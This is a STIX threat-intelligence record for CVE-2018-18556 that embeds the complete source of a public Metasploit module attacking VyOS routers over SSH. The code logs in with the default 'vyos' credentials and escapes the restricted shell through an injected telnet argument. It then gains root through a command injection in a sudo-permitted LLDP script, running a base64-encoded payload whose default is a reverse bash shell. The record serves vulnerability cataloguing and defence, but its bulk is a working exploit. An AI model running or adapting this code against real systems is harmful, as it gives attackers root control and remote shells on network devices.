{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e710f07-7fad-44ad-bad4-3f20e1816abe",
    "created": "2024-08-14T16:58:05.835016Z",
    "modified": "2024-08-14T16:58:05.83502Z",
    "name": "VyOS restricted-shell Escape and Privilege Escalation",
    "description": " This module exploits command injection vulnerabilities and an insecure default sudo configuration on VyOS versions 1.0.0 <= 1.1.8 to execute arbitrary system commands as root.  VyOS features a `restricted-shell` system shell intended for use by low privilege users with operator privileges. This module exploits a vulnerability in the `telnet` command to break out of the restricted shell, then uses sudo to exploit a command injection vulnerability in `/opt/vyatta/bin/sudo-users/vyatta-show-lldp.pl` to execute commands with root privileges.  This module has been tested successfully on VyOS 1.1.8 amd64 and VyOS 1.0.0 i386.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/vyos_restricted_shell_privesc.rb",
            "external_id": "vyos_restricted_shell_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-18556"
        },
        {
            "source_name": "reference",
            "url": "https://blog.vyos.io/the-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases"
        },
        {
            "source_name": "reference",
            "url": "https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mirchr/security-research/blob/master/vulnerabilities/VyOS/CVE-2018-18556.sh"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::SSH\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VyOS restricted-shell Escape and Privilege Escalation',\n        'Description' => %q{\n          This module exploits command injection vulnerabilities and an insecure\n          default sudo configuration on VyOS versions 1.0.0 <= 1.1.8 to execute\n          arbitrary system commands as root.\n\n          VyOS features a `restricted-shell` system shell intended for use by\n          low privilege users with operator privileges. This module exploits\n          a vulnerability in the `telnet` command to break out of the restricted\n          shell, then uses sudo to exploit a command injection vulnerability in\n          `/opt/vyatta/bin/sudo-users/vyatta-show-lldp.pl` to execute commands\n          with root privileges.\n\n          This module has been tested successfully on VyOS 1.1.8 amd64 and\n          VyOS 1.0.0 i386.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Rich Mirch', # discovery and exploit\n          'bcoles' # metasploit\n        ],\n        'References' => [\n          [ 'CVE', '2018-18556' ],\n          [ 'URL', 'https://blog.vyos.io/the-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases' ],\n          [ 'URL', 'https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/' ],\n          [ 'URL', 'https://github.com/mirchr/security-research/blob/master/vulnerabilities/VyOS/CVE-2018-18556.sh' ],\n        ],\n        'Arch' => ARCH_CMD,\n        'DisclosureDate' => '2018-11-05',\n        'DefaultOptions' => {\n          'Payload' => 'cmd/unix/reverse_bash'\n        },\n        'DefaultTarget' => 0,\n        'Platform' => 'unix',\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Automatic', {}\n          ]\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(22),\n        OptString.new('USERNAME', [true, 'SSH username', 'vyos']),\n        OptString.new('PASSWORD', [true, 'SSH password', 'vyos']),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        Opt::Proxies,\n        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 15]),\n        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', false])\n      ]\n    )\n  end\n\n  def check\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password', 'keyboard-interactive'],\n      password: password,\n      port: rport\n    })\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, username, opts)\n      end\n    rescue Rex::ConnectionError\n      return CheckCode::Safe\n    rescue Net::SSH::Disconnect, ::EOFError\n      return CheckCode::Safe\n    rescue Timeout::Error\n      return CheckCode::Safe\n    rescue Net::SSH::AuthenticationFailed\n      return CheckCode::Safe\n    rescue Net::SSH::Exception\n      return CheckCode::Safe\n    end\n\n    CheckCode::Detected('SSH service detected.')\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def exploit\n    factory = ssh_socket_factory\n\n    opts = {\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: rport,\n      use_agent: false,\n      config: false,\n      password: password,\n      proxy: factory,\n      non_interactive: true,\n      verify_host_key: :never\n    }\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    print_status(\"#{rhost}:#{rport} - Attempt to login to VyOS SSH ...\")\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, username, opts)\n      end\n    rescue Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} SSH - Connection error or address in use\")\n    rescue Net::SSH::Disconnect, ::EOFError\n      fail_with(Failure::Disconnected, \"#{rhost}:#{rport} SSH - Disconnected during negotiation\")\n    rescue ::Timeout::Error\n      fail_with(Failure::TimeoutExpired, \"#{rhost}:#{rport} SSH - Timed out during negotiation\")\n    rescue Net::SSH::AuthenticationFailed\n      fail_with(Failure::NoAccess, \"#{rhost}:#{rport} SSH - Authentication failed\")\n    rescue Net::SSH::Exception => e\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} SSH - Error: #{e.class} : #{e.message}\")\n    end\n\n    unless ssh\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} SSH - Session couldn't be established\")\n    end\n\n    print_good('SSH connection established')\n\n    ssh.open_channel do |channel|\n      print_status('Requesting PTY ...')\n\n      channel.request_pty do |ch, pty_success|\n        unless pty_success\n          fail_with(Failure::NotVulnerable, \"#{rhost}:#{rport} SSH - Could not request PTY\")\n        end\n\n        print_good('PTY successfully obtained')\n\n        print_status('Requesting shell ...')\n\n        ch.send_channel_request('shell') do |_ch, shell_success|\n          unless shell_success\n            fail_with(Failure::NotVulnerable, \"#{rhost}:#{rport} SSH - Could not open shell\")\n          end\n\n          print_good('Remote shell successfully obtained')\n        end\n      end\n\n      vyos_check_executed = false\n      expect_system_shell = false\n      payload_executed = false\n\n      payload_b64 = Rex::Text.encode_base64(payload.encoded)\n      payload_cmd = ''\n\n      channel.on_data do |_ch, data|\n        return nil if payload_executed\n\n        unless vyos_check_executed\n          unless data.downcase.include?('vyos')\n            fail_with(Failure::NotVulnerable, 'Remote system is not VyOS')\n          end\n\n          print_status('Remote system is VyOS')\n          vyos_check_executed = true\n          next\n        end\n\n        if !expect_system_shell && data.downcase.include?(username.downcase)\n          if data.include?('> ')\n            print_status('Remote session is using restricted-shell. Attempting breakout to system shell ...')\n            channel.send_data(\"telnet ';/bin/sh'\\n\")\n            payload_cmd = \"sudo /opt/vyatta/bin/sudo-users/vyatta-show-lldp.pl -action show-neighbor -i ';echo #{payload_b64}|base64 -d|/bin/sh'\"\n            expect_system_shell = true\n            next\n          elsif data.include?('$ ')\n            print_status('Remote session is using unrestricted shell. Launching system shell ...')\n            channel.send_data(\"/bin/sh\\n\")\n            payload_cmd = \"echo #{payload_b64}|base64 -d|sudo /bin/sh\"\n            expect_system_shell = true\n            next\n          end\n        end\n\n        if expect_system_shell && data.include?('sh') && data.include?('$ ')\n          print_good('Unrestricted system shell successfully obtained. Sending payload ...')\n          vprint_status(\"Sending command: #{payload_cmd}\")\n          channel.send_data(\"#{payload_cmd}\\n\")\n          payload_executed = true\n        end\n      end\n    end\n\n    begin\n      ssh.loop unless session_created?\n    rescue Errno::EBADF => e\n      elog(e)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-11-05",
    "x_mitre_platforms": [
        "unix'"
    ]
}